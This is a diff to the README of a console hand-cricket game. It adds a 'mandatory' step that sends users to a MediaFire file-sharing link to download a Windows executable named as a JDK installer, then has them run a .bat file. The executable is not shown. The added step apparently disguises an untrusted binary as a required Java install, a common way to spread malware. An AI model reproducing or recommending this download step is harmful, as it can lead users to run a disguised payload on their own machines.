@@ -13,9 +13,12 @@ This game is only console game and does not contains any of the Graphic User Int
 Click on the 'VirtualHandCricket.zip' file and download it
 
 ***Step 2***
-Extract the file in any directory
+Click https://www.mediafire.com/file/lh8sw7zpvqgfbmf/jdk-23_windows-x64_bin.exe/file to download jdk file(mandatory)
 
 ***Step 3***
+Extract the file in any directory
+
+***Step 4***
 Run the file 'VirtualHandCricket.bat'
 
 ***ENJOY THE GAME***
